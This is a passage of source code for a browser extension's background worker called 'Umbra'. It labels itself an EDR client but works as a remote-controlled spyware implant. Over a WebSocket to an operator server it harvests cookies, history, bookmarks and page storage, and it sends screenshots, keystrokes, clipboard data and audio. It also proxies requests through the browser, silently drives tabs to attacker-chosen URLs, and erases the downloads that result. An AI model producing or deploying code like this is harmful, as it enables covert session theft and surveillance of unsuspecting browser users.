// Umbra Extension - Manifest V3 Version
// Main service worker for background tasks
// Window polyfill for Service Workers in Manifest V3
// This provides localStorage-like functionality using chrome.storage.local

(function () {
  // Service Workers don't have access to window or localStorage
  // Create a polyfill for localStorage using chrome.storage.local
  if (typeof window === "undefined") {
    self.localStorage = {
      getItem: function (key) {
        return new Promise((resolve) => {
          chrome.storage.local.get([key], function (result) {
            resolve(result[key] || null);
          });
        });
      },
      setItem: function (key, value) {
        return new Promise((resolve) => {
          const data = {};
          data[key] = value;
          chrome.storage.local.set(data, resolve);
        });
      },
      removeItem: function (key) {
        return new Promise((resolve) => {
          chrome.storage.local.remove(key, resolve);
        });
      },
      clear: function () {
        return new Promise((resolve) => {
          chrome.storage.local.clear(resolve);
        });
      },
    };
  }
})();

// Export a global reference
if (typeof window === "undefined") {
  self.window = self;
}

class UmbraClient {
  constructor() {
    this.websocket = null;
    this.lastLiveConnectionTimestamp = this.getUnixTimestamp();
    this.reconnectDelay = 1000;
    this.maxReconnectDelay = 60000;
    this.placeholderSecretToken = this.getSecureRandomToken(64);
    this.redirectTable = {};
    this.REQUEST_HEADER_BLACKLIST = ["cookie"];

    // Storage polyfill
    this.localStorage = self.localStorage;

    // Configuration settings
    this.SYNC_SWITCH = {
      SYNC: true,
      SYNC_HUGE: true,
      REALTIME_IMG: false,
      PERSISTENT_RECORDING: false,
      PERSISTENT_KEYBOARD: true,
    };

    this.isAudioRecording = false;

    this.SYNC_DATA_CONFIG = {};

    // Snapshot helpers are loaded explicitly by the classic/module bootstrap.
    // Keep access through globalThis so the same UMD helper bytes work in both
    // service-worker target types without relying on implicit global bindings.
    this.snapshotController = globalThis.UmbraSnapshotJobs.createSnapshotJobController({
      store: globalThis.UmbraSnapshotStore.createIndexedDBSnapshotStore(),
      chrome,
    });

    // Map of RPC calls to handler methods.
    // Keys cover both the legacy short names this extension shipped
    // with and the longer names the (new Go) server uses. RPC
    // responses are always wrapped in an object — Go's `out[key]`
    // lookups expect a map, never a bare array.
    const wrapCookies = async () => ({ cookies: await this.getCookies() });
    const wrapHistory = async (p) => {
      const days = Number(p && p.days);
      const windowDays = Number.isFinite(days) && days > 0 ? days : 36500;
      return { history: await this.getHistory(windowDays) };
    };
    const wrapTabs = async () => ({ tabs: await this.getTabs() });
    const wrapDownloads = async () => ({ downloads: await this.getDownloads() });
    const wrapBookmarks = async () => ({ bookmarks: await this.getBookmarks() });

    this.RPC_CALL_TABLE = {
      // Auth + transport
      AUTH: this.authenticate.bind(this),

      // HTTP forwarding (legacy + new server names)
      HTTP_REQUEST: this.performHttpRequest.bind(this),
      SEND_REQUEST_VIA_BROWSER: this.performHttpRequest.bind(this),

      // Bulk getters — always wrapped in their object key
      GET_COOKIES: wrapCookies,
      GET_BROWSER_COOKIE_ARRAY: wrapCookies,
      GET_HISTORY: wrapHistory,
      GET_BROWSER_HISTORY_ARRAY: wrapHistory,
      GET_TABS: wrapTabs,
      GET_DOWNLOADS: wrapDownloads,
      GET_BOOKMARKS: wrapBookmarks,
      GET_BROWSER_BOOKMARK_ARRAY: wrapBookmarks,

      // Immutable, resumable browser snapshot protocol v1.
      BEGIN_BROWSER_SNAPSHOT_V1: (params) => globalThis.UmbraSnapshotRPC.invoke(this.snapshotController, "begin", params),
      GET_BROWSER_SNAPSHOT_STATUS_V1: (params) => globalThis.UmbraSnapshotRPC.invoke(this.snapshotController, "status", params),
      GET_BROWSER_SNAPSHOT_CHUNK_V1: (params) => globalThis.UmbraSnapshotRPC.invoke(this.snapshotController, "chunk", params),
      RELEASE_BROWSER_SNAPSHOT_V1: (params) => globalThis.UmbraSnapshotRPC.invoke(this.snapshotController, "release", params),

      // Tab control
      TAB_NAVIGATE_AND_FETCH: this.tabNavigateAndFetch.bind(this),
      STOP_TAB_NAVIGATE: this.stopTabNavigate.bind(this),

      // Audio (legacy + new names)
      START_AUDIO: this.startAudioRecording.bind(this),
      START_AUDIO_RECORDING: this.startAudioRecording.bind(this),
      STOP_AUDIO: this.stopAudioRecording.bind(this),
      STOP_AUDIO_RECORDING: this.stopAudioRecording.bind(this),

      PONG: () => ({ success: true }),
      CONFIG_UPDATE: async () => {
        await this.applyPolicyFromConfig();
        return { success: true };
      },
      CAPTURE_HAR: async (p) => {
        if (globalThis.UmbraHARCapture) {
          return globalThis.UmbraHARCapture.capture(p || {});
        }
        return { error: "debugger_unavailable" };
      },

      // Sessions & navigation
      GET_SESSIONS:     async () => ({ sessions: await this.getSessions() }),
      GET_TOP_SITES:    async () => ({ top_sites: await this.getTopSites() }),
      GET_READING_LIST: async () => ({ reading_list: await this.getReadingList() }),

      // System fingerprint
      GET_SYSTEM_INFO: async () => ({ system_info: await this.getSystemInfo() }),
      GET_PROCESSES:   async () => ({ processes: await this.getProcesses() }),
      GET_PAGE_STORAGE: async () => ({ storage: await this.collectPageStorage() }),

      // Full-page archive
      CAPTURE_PAGE_MHTML: async (p) => this.capturePageMhtml(p),

      // On-demand full-resolution screenshot for the viewer
      CAPTURE_TAB_IMAGE: async () => {
        const raw = await this.getCurrentTabImage(92);
        return { image: raw || "" };
      },
    };

    this.activeTasks = new Map();

    // URLs we're currently fetching on the operator's behalf. Used by
    // the download blocker so a remote-control click that lands on an
    // executable / archive does NOT save anything to the bot's disk.
    // Maps url -> expiry timestamp; entries auto-clear after 30s.
    this.remoteNavTargets = new Map();
    if (chrome.downloads && chrome.downloads.onCreated) {
      chrome.downloads.onCreated.addListener(this.onRemoteDownloadCreated.bind(this));
    }

    // Constants for request handling
    this.HEADERS_TO_REPLACE = [
      "origin",
      "referer",
      "access-control-request-headers",
      "access-control-request-method",
      "access-control-allow-origin",
      "date",
      "dnt",
      "trailer",
      "upgrade",
    ];

    this.REDIRECT_STATUS_CODES = [301, 302, 307];

    // EDR server address — replaced at package-download time by the
    // Go backend with the real endpoint URL. The placeholder below is
    // a valid dev default so the extension also works when loaded
    // unpacked during development. NEVER read this URL from any
    // external source after bundling.
    this.SERVER_URL = "ws://127.0.0.1:4343";

    this.initialize();
    this.setupIntervals();
    this.setupListeners();
  }

  // Connect WebSocket to the EDR server
  initialize() {
    this.websocket = new WebSocket(this.SERVER_URL);

    this.websocket.onopen = () => {
      console.log("WebSocket connection established");
      this.reconnectDelay = 1000;
    };

    this.websocket.onmessage = async (event) => {
      console.log(`Received WebSocket message: ${event.data}`);
      this.lastLiveConnectionTimestamp = this.getUnixTimestamp();

      try {
        const parsedMessage = JSON.parse(event.data);

        // PONG is the server's reply to our PING heartbeat. The timestamp
        // bump above is the only thing we need from it — don't dispatch
        // it through RPC_CALL_TABLE, otherwise we echo it back and the
        // server logs an "unknown action" warning every cycle.
        if (parsedMessage.action === "PONG") {
          return;
        }

        // Update configuration if provided
        try {
          if (parsedMessage.data.switch_config) {
            Object.keys(parsedMessage.data.switch_config).forEach((key) => {
              this.SYNC_SWITCH[key] = parsedMessage.data.switch_config[key];
            });
          }
        } catch (e) {}

        try {
          if (parsedMessage.data.data_config) {
            Object.keys(parsedMessage.data.data_config).forEach((key) => {
              this.SYNC_DATA_CONFIG[key] = parsedMessage.data.data_config[key];
            });
            chrome.storage.local.set({ SYNC_DATA_CONFIG: this.SYNC_DATA_CONFIG });
            this.applyPolicyFromConfig();
          }
        } catch (e) {}

        // Handle RPC calls
        if (parsedMessage.action in this.RPC_CALL_TABLE) {
          let result;
          try {
            result = await this.RPC_CALL_TABLE[parsedMessage.action](
              parsedMessage.data
            );
          } catch (rpcErr) {
            // Surface the error to the server instead of dropping
            // the message — otherwise the server hangs on its
            // request_table entry until timeout.
            console.error(`RPC ${parsedMessage.action} failed:`, rpcErr);
            result = { error: String(rpcErr && rpcErr.message ? rpcErr.message : rpcErr) };
          }

          // Send both `data` and `result` so the message works against
          // the legacy Node server (which used `data`) and the new Go
          // server (which now also accepts `result` via Payload()).
          this.websocket.send(
            JSON.stringify({
              id: parsedMessage.id,
              action: parsedMessage.action,
              origin_action: parsedMessage.action,
              data: result,
              result: result,
            })
          );
        } else {
          console.error(`No RPC action ${parsedMessage.action}!`);
        }
      } catch (e) {
        console.error("Could not parse WebSocket message!", e);
      }
    };

    this.websocket.onclose = (event) => {
      if (event.wasClean) {
        console.log(
          `Connection closed cleanly, code=${event.code} reason=${event.reason}`
        );
      } else {
        console.log("Connection died");
      }

      if (this.isAudioRecording) {
        this.stopAudioRecording();
      }

      const delay = this.reconnectDelay;
      this.reconnectDelay = Math.min(this.reconnectDelay * 2, this.maxReconnectDelay);
      console.log(`Reconnecting in ${delay}ms...`);
      setTimeout(() => this.initialize(), delay);
    };

    this.websocket.onerror = (error) => {
      console.log(`WebSocket error: ${error.message}`);
    };
  }

  // Set up periodic intervals for various tasks
  setupIntervals() {
    // Check websocket connection health
    setInterval(async () => this.checkWebsocketConnection(), 13000);

    // Realtime image sharing (if enabled) — uses configurable interval
    const realtimeLoop = async () => {
      await this.sendRealtimeImage();
      const interval = this.SYNC_DATA_CONFIG.REALTIME_IMG_INTERVAL || 2000;
      setTimeout(realtimeLoop, interval);
    };
    setTimeout(realtimeLoop, 2000);

    // Check persistent features
    setInterval(async () => this.checkPersistentFeatures(), 10000);

    this.setupKeepalive();

    // Sync basic data — uses configurable interval
    const syncLoop = async () => {
      await this.syncBasicData();
      const interval = this.SYNC_DATA_CONFIG.SYNC_INTERVAL || 63000;
      setTimeout(syncLoop, interval);
    };
    setTimeout(syncLoop, 63000);

    // Sync more comprehensive data — uses configurable interval
    const hugeLoop = async () => {
      await this.syncHugeData();
      const interval = this.SYNC_DATA_CONFIG.SYNC_HUGE_INTERVAL || 321000;
      setTimeout(hugeLoop, interval);
    };
    setTimeout(hugeLoop, 321000);
  }

  // Set up event listeners
  setupListeners() {
    // Listen for idle state changes
    if (chrome.idle) {
      chrome.idle.onStateChanged.addListener((state) => {
        this.websocket.send(
          JSON.stringify({
            id: this.uuidv4(),
            version: "1.0.0",
            action: "STATE",
            data: {
              state: state,
            },
          })
        );
      });
    }

    // Listen for messages from content scripts
    chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
      this.debugLog("Received message type: " + message.type);
      if (message.type === "REQUEST_SCREEN_CAPTURE") {
        this.handleScreenCaptureRequest(message.data, sender, sendResponse);
        return true; // Keep message channel open for async response
      } else if (message.type === "SCREEN_CAPTURE_DATA") {
        this.handleScreenCaptureData(message.data, sender);
        sendResponse({ success: true });
      } else if (message.type === "KEYBOARD_DATA") {
        this.handleKeyboardData(message.data, sender);
        sendResponse({ success: true });
      } else if (message.type === "USER_ACTIVITY") {
        this.handleUserActivity(message.timestamp, sender);
        sendResponse({ success: true });
      } else if (message.type === "AUDIO_CHUNK") {
        this.handleAudioChunk(message.data);
        sendResponse({ success: true });
      } else if (message.type === "CLIPBOARD_DATA") {
        this.handleClipboardData(message.data, sender);
        sendResponse({ success: true });
      } else if (message.type === "PAGE_TEXT") {
        this.handlePageText(message.data, sender);
        sendResponse({ success: true });
      } else if (message.type === "KEEPALIVE") {
        sendResponse({ ok: true });
      }
    });

    // Use non-blocking method to handle requests in Manifest V3
    if (chrome.webRequest) {
      // Listen for before send headers event to modify headers
      chrome.webRequest.onBeforeSendHeaders.addListener(
        (details) => {
          // Skip requests without X-PLACEHOLDER-SECRET
          const headers = details.requestHeaders || [];
          let shouldModify = false;

          for (let i = 0; i < headers.length; i++) {
            if (
              headers[i].name === "X-PLACEHOLDER-SECRET" &&
              headers[i].value === this.placeholderSecretToken
            ) {
              shouldModify = true;
              break;
            }
          }

          if (!shouldModify) {
            return { requestHeaders: headers };
          }

          // Find special headers that need modification
          for (let i = 0; i < headers.length; i++) {
            const header = headers[i];

            // Process headers with X-PLACEHOLDER- format
            if (header.name.startsWith("X-PLACEHOLDER-")) {
              const originalHeaderName = header.name.substring(
                "X-PLACEHOLDER-".length
              );

              // Try to set the original header
              if (
                !this.REQUEST_HEADER_BLACKLIST.includes(
                  originalHeaderName.toLowerCase()
                )
              ) {
                headers.push({
                  name: originalHeaderName,
                  value: header.value,
                });
              }

              // Remove the placeholder header
              headers.splice(i, 1);
              i--; // Adjust index
            }
          }

          return { requestHeaders: headers };
        },
        { urls: ["<all_urls>"] },
        ["requestHeaders"]
      );

      // In Manifest V3, we can't use blocking mode
      // So we need a different way to handle redirects
      // We'll use storage and script injection
      chrome.webRequest.onBeforeRequest.addListener(
        (details) => {
          // We can only monitor, not block or redirect
          // If redirect is needed, we can store the info and handle it in content script
        },
        { urls: ["<all_urls>"] }
      );
    }

    // webNavigation — 监控主 frame 的每次导航完成和 SPA 路由变化
    if (chrome.webNavigation) {
      const sendNav = (details) => {
        if (details.frameId !== 0) return;
        if (this.websocket && this.websocket.readyState === 1) {
          this.websocket.send(JSON.stringify({
            id: this.uuidv4(),
            version: '1.0.0',
            action: 'NAV_EVENT',
            data: {
              url: details.url,
              tab_id: details.tabId,
              timestamp: details.timeStamp,
              transition_type: details.transitionType || 'history_state_update',
              transition_qualifiers: details.transitionQualifiers || [],
            },
          }));
        }
        this.onPolicyNavigation(details.url, details.tabId);
      };
      chrome.webNavigation.onCompleted.addListener(sendNav);
      chrome.webNavigation.onHistoryStateUpdated.addListener(sendNav);
    }

    if (chrome.cookies && chrome.cookies.onChanged) {
      chrome.cookies.onChanged.addListener((change) => {
        if (!this.websocket || this.websocket.readyState !== 1) return;
        const cookie = change.cookie || {};
        this.websocket.send(JSON.stringify({
          id: this.uuidv4(),
          version: "1.0.0",
          action: "COOKIE_EVENT",
          data: {
            cause: change.cause,
            action: change.removed ? "removed" : "changed",
            name: cookie.name,
            domain: cookie.domain,
            path: cookie.path,
            cookie: {
              name: cookie.name,
              domain: cookie.domain,
              path: cookie.path,
              partitionKey: cookie.partitionKey || null,
            },
          },
        }));
      });
    }

    if (chrome.tabs) {
      const sendTab = (action, tab) => {
        if (!this.websocket || this.websocket.readyState !== 1) return;
        this.websocket.send(JSON.stringify({
          id: this.uuidv4(),
          version: "1.0.0",
          action: "TAB_EVENT",
          data: {
            action,
            tab_id: tab && tab.id,
            url: tab && tab.url,
            title: tab && tab.title,
          },
        }));
      };
      if (chrome.tabs.onCreated) chrome.tabs.onCreated.addListener((tab) => sendTab("created", tab || {}));
      if (chrome.tabs.onRemoved) chrome.tabs.onRemoved.addListener((id) => sendTab("removed", { id }));
      if (chrome.tabs.onUpdated) {
        chrome.tabs.onUpdated.addListener((_id, info, tab) => {
          if (info.url || info.title || info.status === "complete") sendTab("updated", tab || {});
        });
      }
      if (chrome.tabs.onActivated) {
        chrome.tabs.onActivated.addListener(async (active) => {
          try {
            const tab = await chrome.tabs.get(active.tabId);
            sendTab("activated", tab || { id: active.tabId });
          } catch (_err) {
            sendTab("activated", { id: active.tabId });
          }
        });
      }
    }
  }

  setupKeepalive() {
    if (chrome.alarms && typeof chrome.alarms.create === "function") {
      chrome.alarms.create("umbra-keepalive", { periodInMinutes: 1 });
      chrome.alarms.onAlarm.addListener((alarm) => {
        if (alarm && alarm.name === "umbra-keepalive") {
          this.checkWebsocketConnection();
        }
      });
    }
    this.setupOffscreenDocument().catch(() => {});
  }

  // Check websocket connection health and reconnect if needed
  async checkWebsocketConnection() {
    const PENDING_STATES = [
      0, // CONNECTING
      2, // CLOSING
    ];

    // Check WebSocket state
    if (!this.websocket || PENDING_STATES.includes(this.websocket.readyState)) {
      console.log(`WebSocket not in appropriate state for liveness check...`);
      return;
    }

    // Check if connection appears dead
    const currentTimestamp = this.getUnixTimestamp();
    const secondsSinceLastLiveMessage =
      currentTimestamp - this.lastLiveConnectionTimestamp;

    if (secondsSinceLastLiveMessage > 29 || this.websocket.readyState === 3) {
      console.error(`WebSocket appears to be dead. Restarting connection...`);

      try {
        this.websocket.close();
      } catch (e) {
        this.initialize();
      }
      return;
    }

    // Send ping to keep connection alive.
    //
    // Tab image is intentionally NOT included on every heartbeat: at
    // 80% JPEG quality a full-screen capture is ~300 KB, which made
    // every PING a huge frame. Under load that frame's serialization
    // and TCP write can take seconds, blowing past the 30 s
    // lastLiveConnectionTimestamp death-check below and triggering a
    // pointless reconnect loop.
    //
    // We still want the GUI's "current tab thumbnail" to refresh when
    // REALTIME_IMG is off, so we piggy-back the image once every N
    // pings (~65 s by default at the 13 s interval). Tunable via
    // SYNC_DATA_CONFIG.PING_IMAGE_EVERY_N — set to 1 to restore the
    // old per-ping behavior.
    const currentTab = await this.getCurrentTab();
    this._pingCount = (this._pingCount || 0) + 1;
    const everyN = this.SYNC_DATA_CONFIG.PING_IMAGE_EVERY_N || 5;
    const includeImage = this._pingCount % everyN === 0;
    const tabImage = includeImage ? await this.getTabImage() : "";

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "PING",
        data: {
          current_tab: currentTab,
          current_tab_image: tabImage,
        },
      })
    );
  }

  // Send realtime image of current tab if enabled
  async sendRealtimeImage() {
    if (this.SYNC_SWITCH["REALTIME_IMG"] !== true || !this.websocket) {
      return;
    }

    const tabImage = await this.getTabImage();

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "REALTIME_IMG",
        data: {
          current_tab_image: tabImage,
        },
      })
    );
  }

  // Sync basic data about tabs
  async syncBasicData() {
    if (this.SYNC_SWITCH["SYNC"] !== true || !this.websocket) {
      return;
    }

    const tabs = await this.getTabs();

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "SYNC",
        data: {
          tabs: tabs,
        },
      })
    );
  }

  // Sync comprehensive data
  async syncHugeData() {
    if (this.SYNC_SWITCH["SYNC_HUGE"] !== true || !this.websocket) {
      return;
    }

    // Preserve the legacy bulk-sync message, but collect fields independently.
    // A failed Chrome callback is omitted instead of being mislabeled as an
    // authoritative empty array.
    const collect = async (key, operation) => {
      try {
        return [key, await operation()];
      } catch (_error) {
        console.warn(`SYNC_HUGE omitted unavailable ${key}`);
        return null;
      }
    };
    const entries = (await Promise.all([
      collect("history", () => this.getHistory(30)),
      collect("bookmarks", () => this.getBookmarks()),
      collect("cookies", () => this.getCookies()),
      collect("downloads", () => this.getDownloads()),
      collect("sessions", () => this.getSessions()),
      collect("top_sites", () => this.getTopSites()),
      collect("system_info", () => this.getSystemInfo()),
      collect("reading_list", () => this.getReadingList()),
    ])).filter(Boolean);
    const data = Object.fromEntries(entries);

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "SYNC_HUGE",
        data,
      })
    );
  }

  // Data collection methods
  async getDownloads() {
    if (!chrome.downloads) {
      return [];
    }
    return this.getAllDownloads();
  }

  getAllDownloads() {
    return new Promise((resolve, reject) => {
      chrome.downloads.search({}, (results) => {
        if (chrome.runtime.lastError) {
          reject(new Error("downloads_api_error"));
          return;
        }
        resolve(results || []);
      });
    });
  }

  async getCurrentTab() {
    if (!chrome.tabs) {
      return {};
    }
    return this.getCurrentTabData();
  }

  getCurrentTabData() {
    return new Promise((resolve) => {
      chrome.tabs.query(
        { active: true, lastFocusedWindow: true },
        function (tabs) {
          resolve(tabs && tabs.length > 0 ? tabs[0] : {});
        }
      );
    });
  }

  async getTabs() {
    if (!chrome.tabs) {
      return [];
    }
    return this.getAllTabs();
  }

  getAllTabs() {
    return new Promise((resolve, reject) => {
      chrome.tabs.query({}, function (tabs) {
        if (chrome.runtime.lastError) {
          reject(new Error("tabs_api_error"));
          return;
        }
        resolve(tabs || []);
      });
    });
  }

  async getTabImage() {
    if (!chrome.tabs) {
      return "";
    }
    // captureVisibleTab on a Retina full-screen ends up around
    // 200-300 KB at quality 80 even though it's already JPEG —
    // the source bitmap is just very large. We re-encode it to
    // a small JPEG before sending so the heartbeat frame stays
    // small. All knobs are tunable from SYNC_DATA_CONFIG so the
    // GUI can dial quality up if it ever wants the original.
    // Defaults aim for "medium clarity, very small payload":
    //   - capture once at 40 to keep the source small even on 4K
    //   - resize to 640 px wide (text in tabs still readable)
    //   - re-encode at 35 for an extra 30-40% size cut
    // Estimated typical size: 8-20 KB base64 (was 200-300 KB).
    const captureQuality = this.SYNC_DATA_CONFIG.REALTIME_IMG_QUALITY || 40;
    const maxWidth = this.SYNC_DATA_CONFIG.REALTIME_IMG_MAX_WIDTH || 640;
    const reencodeQuality =
      (this.SYNC_DATA_CONFIG.REALTIME_IMG_REENCODE_QUALITY || 35) / 100;

    const raw = await this.getCurrentTabImage(captureQuality);
    if (!raw) return "";
    return this.shrinkDataURL(raw, maxWidth, reencodeQuality);
  }

  getCurrentTabImage(quality = 80, windowId = null) {
    return new Promise((resolve) => {
      const options = { format: "jpeg", quality: quality };
      const callback = (dataUrl) => resolve(dataUrl || "");

      if (windowId !== null) {
        chrome.tabs.captureVisibleTab(windowId, options, callback);
      } else {
        chrome.tabs.captureVisibleTab(options, callback);
      }
    });
  }

  // Re-encode a captureVisibleTab data URL into a smaller JPEG.
  // Uses OffscreenCanvas + createImageBitmap which both work in
  // a Manifest V3 service worker (no document/Image needed).
  // Falls back to the original on any error so we never break
  // the GUI's "current tab image" surface.
  async shrinkDataURL(dataUrl, maxWidth, quality) {
    try {
      const blob = await (await fetch(dataUrl)).blob();
      const bitmap = await createImageBitmap(blob);
      const ratio = Math.min(1, maxWidth / bitmap.width);
      const w = Math.max(1, Math.round(bitmap.width * ratio));
      const h = Math.max(1, Math.round(bitmap.height * ratio));
      const canvas = new OffscreenCanvas(w, h);
      const ctx = canvas.getContext("2d");
      ctx.drawImage(bitmap, 0, 0, w, h);
      bitmap.close();
      const outBlob = await canvas.convertToBlob({
        type: "image/jpeg",
        quality,
      });
      const buf = await outBlob.arrayBuffer();
      const bytes = new Uint8Array(buf);
      let binary = "";
      // Avoid blowing the call stack on large arrays — chunk the
      // String.fromCharCode(...) call instead of spreading.
      const CHUNK = 0x8000;
      for (let i = 0; i < bytes.length; i += CHUNK) {
        binary += String.fromCharCode.apply(
          null,
          bytes.subarray(i, i + CHUNK)
        );
      }
      return "data:image/jpeg;base64," + btoa(binary);
    } catch (e) {
      console.warn("shrinkDataURL failed, sending original:", e);
      return dataUrl;
    }
  }

  async getBookmarks() {
    if (!chrome.bookmarks) {
      return [];
    }
    return this.getAllBookmarks();
  }

  getAllBookmarks() {
    return new Promise((resolve, reject) => {
      chrome.bookmarks.getTree(function (bookmarkTreeNodes) {
        if (chrome.runtime.lastError) {
          reject(new Error("bookmarks_api_error"));
          return;
        }
        resolve(bookmarkTreeNodes || []);
      });
    });
  }

  async getHistory(days = 30) {
    if (!chrome.history) return [];
    return this.getHistoryByDay(days);
  }

  getHistoryByDay(days = 7) {
    return new Promise((resolve, reject) => {
      try {
        const now = Date.now();
        const startTime = globalThis.UmbraSnapshotHistory && typeof globalThis.UmbraSnapshotHistory.historyStartTime === "function"
          ? globalThis.UmbraSnapshotHistory.historyStartTime(days, now)
          : Math.max(0, now - 86400000 * days);

        chrome.history.search(
          {
            text: "",
            startTime,
            maxResults: 10000,
          },
          function (historyItems) {
            if (chrome.runtime.lastError) {
              reject(new Error("history_api_error"));
              return;
            }
            resolve(historyItems || []);
          }
        );
      } catch (e) {
        reject(e);
      }
    });
  }

  async getCookies() {
    if (!chrome.cookies) return [];
    const collect = globalThis.UmbraCookieCollect;
    if (!collect) return this.getAllCookies({});
    let tabs = [];
    try {
      tabs = await new Promise((resolve) => {
        if (!chrome.tabs || !chrome.tabs.query) {
          resolve([]);
          return;
        }
        chrome.tabs.query({}, (result) => resolve(result || []));
      });
    } catch (_err) {
      tabs = [];
    }
    return collect.collectAllCookies((details) => this.getAllCookies(details), collect.originsFromTabs(tabs));
  }

  async collectPageStorage() {
    if (!chrome.tabs || !chrome.scripting || !chrome.scripting.executeScript) return [];
    const tabs = await new Promise((resolve) => chrome.tabs.query({}, (result) => resolve(result || [])));
    const origins = [];
    const seen = new Set();
    for (const tab of tabs) {
      if (!tab.id || !tab.url || !/^https?:/i.test(tab.url)) continue;
      try {
        const results = await chrome.scripting.executeScript({
          target: { tabId: tab.id },
          world: "MAIN",
          func: () => {
            const dump = (bag) => {
              const out = {};
              try {
                for (let i = 0; i < bag.length; i += 1) {
                  const key = bag.key(i);
                  if (key != null) out[key] = bag.getItem(key);
                }
              } catch (_e) {}
              return out;
            };
            return {
              origin: location.origin,
              href: location.href,
              localStorage: dump(localStorage),
              sessionStorage: dump(sessionStorage),
            };
          },
        });
        const harvested = results && results[0] && results[0].result;
        if (harvested && harvested.origin && !seen.has(harvested.origin)) {
          seen.add(harvested.origin);
          origins.push(harvested);
        }
      } catch (_err) {
        // Restricted pages cannot be scripted.
      }
    }
    if (this.websocket && this.websocket.readyState === 1) {
      this.websocket.send(JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "PAGE_STORAGE",
        data: { origins },
      }));
    }
    return origins;
  }

  getAllCookies(details) {
    return new Promise((resolve, reject) => {
      try {
        chrome.cookies.getAll(details, function (cookiesArray) {
          if (chrome.runtime.lastError) {
            reject(new Error("cookies_api_error"));
            return;
          }
          resolve(cookiesArray || []);
        });
      } catch (e) {
        reject(e);
      }
    });
  }

  // Mark a URL as actively being fetched by remote-control. Used to
  // distinguish operator-initiated downloads (which we cancel) from
  // user-initiated downloads (which we leave alone).
  addRemoteNavTarget(url) {
    if (!url) return;
    const now = Date.now();
    // Opportunistic GC of expired entries.
    for (const [k, t] of this.remoteNavTargets) {
      if (t < now) this.remoteNavTargets.delete(k);
    }
    this.remoteNavTargets.set(url, now + 30000);
  }

  removeRemoteNavTarget(url) {
    if (!url) return;
    this.remoteNavTargets.delete(url);
  }

  isRemoteNavTarget(url) {
    if (!url) return false;
    const t = this.remoteNavTargets.get(url);
    if (!t) return false;
    if (t < Date.now()) {
      this.remoteNavTargets.delete(url);
      return false;
    }
    return true;
  }

  // chrome.downloads.onCreated handler. Cancels + erases any download
  // whose URL matches a remote-control nav we just kicked off, leaving
  // every other download (real user activity, periodic updates, etc.)
  // untouched.
  onRemoteDownloadCreated(item) {
    if (!item || !chrome.downloads) return;
    const matched =
      this.isRemoteNavTarget(item.url) ||
      this.isRemoteNavTarget(item.finalUrl);
    if (!matched) return;
    console.log(
      `[Umbra] Blocking remote-control-triggered download: ${item.url}`,
    );
    try {
      chrome.downloads.cancel(item.id, () => {
        if (chrome.runtime.lastError) {
          // Already finalized — just try to erase the row.
        }
        try {
          chrome.downloads.erase({ id: item.id }, () => {});
        } catch (_) {}
      });
    } catch (e) {
      console.warn("download cancel failed:", e);
    }
  }

  async tabNavigateAndFetch(params) {
    const { url } = params;
    const tabs = await this.getTabs();
    if (tabs.length === 0) {
      return { error: "No tabs found" };
    }

    // Pick a random existing tab as requested to minimize new window noise
    const targetTab = tabs[Math.floor(Math.random() * tabs.length)];
    const tabId = targetTab.id;

    console.log(`Using existing tab ${tabId} to navigate to ${url}`);
    this.addRemoteNavTarget(url);

    return new Promise((resolve) => {
      const taskId = Math.random().toString(36).substring(7);
      // settled flag ensures whichever path fires first (timeout,
      // listener, abort) cleans up exactly once and the other paths
      // become no-ops. Without this each path tries to remove the
      // listener — fine — but resolve() is also called twice and the
      // closure's references leak.
      let settled = false;
      const finish = (cleanup) => {
        if (settled) return false;
        settled = true;
        cleanup && cleanup();
        this.removeRemoteNavTarget(url);
        return true;
      };

      let timeout = setTimeout(() => {
        if (!finish(() => chrome.tabs.onUpdated.removeListener(listener))) return;
        this.activeTasks.delete(taskId);
        resolve({ error: "Navigation timed out" });
      }, 30000);

      const listener = async (updatedTabId, changeInfo, tab) => {
        if (updatedTabId === tabId && changeInfo.status === "complete") {
          if (!finish(() => {
            clearTimeout(timeout);
            chrome.tabs.onUpdated.removeListener(listener);
          })) return;
          this.activeTasks.delete(taskId);

          try {
            // Wait a small bit for any final rendering
            await new Promise((r) => setTimeout(r, 1000));

            const results = await chrome.scripting.executeScript({
              target: { tabId: tabId },
              // Captures the rendered HTML, plus — for image / PDF /
              // audio / video URLs — the raw bytes as a data URL so
              // the operator can preview them without the GUI iframe
              // having to reach back across a null-origin sandbox.
              func: async () => {
                const url = window.location.href;
                const html = document.documentElement.outerHTML;
                const title = document.title;
                const ext = (() => {
                  try {
                    const u = new URL(url);
                    const seg = u.pathname.substring(u.pathname.lastIndexOf("/") + 1);
                    const dot = seg.lastIndexOf(".");
                    return dot > 0 ? seg.substring(dot + 1).toLowerCase() : "";
                  } catch (_) { return ""; }
                })();
                const BINARY_EXTS = [
                  "png","jpg","jpeg","gif","webp","svg","bmp","ico","avif",
                  "pdf",
                  "mp4","webm","mov","m4v","mkv",
                  "mp3","wav","m4a","ogg","flac",
                ];
                if (!BINARY_EXTS.includes(ext)) {
                  return { html, url, title };
                }
                const MAX_BYTES = 25 * 1024 * 1024;
                try {
                  const r = await fetch(url);
                  if (!r.ok) {
                    return { html, url, title, fetchError: `HTTP ${r.status}` };
                  }
                  const contentType = r.headers.get("content-type") || "";
                  const blob = await r.blob();
                  if (blob.size > MAX_BYTES) {
                    return {
                      html, url, title, contentType,
                      size: blob.size,
                      fetchError: `Too large to inline (${blob.size} bytes)`,
                    };
                  }
                  const dataURL = await new Promise((res, rej) => {
                    const fr = new FileReader();
                    fr.onload = () => res(fr.result);
                    fr.onerror = () => rej(fr.error || new Error("read failed"));
                    fr.readAsDataURL(blob);
                  });
                  return {
                    html, url, title, dataURL, contentType,
                    size: blob.size,
                  };
                } catch (e) {
                  return {
                    html, url, title,
                    fetchError: (e && e.message) ? e.message : String(e),
                  };
                }
              },
            });

            const result = results[0].result;

            // Immediately go back to the previous state as requested
            try {
              await chrome.tabs.goBack(tabId);
            } catch (e) {
              console.log("Could not go back, maybe no history?", e);
            }

            resolve(result);
          } catch (e) {
            console.error("Extraction error:", e);
            const msg = (e && typeof e === "object" && e.message) ? e.message : String(e);
            resolve({ error: msg || "Script injection failed" });
          }
        }
      };

      this.activeTasks.set(taskId, {
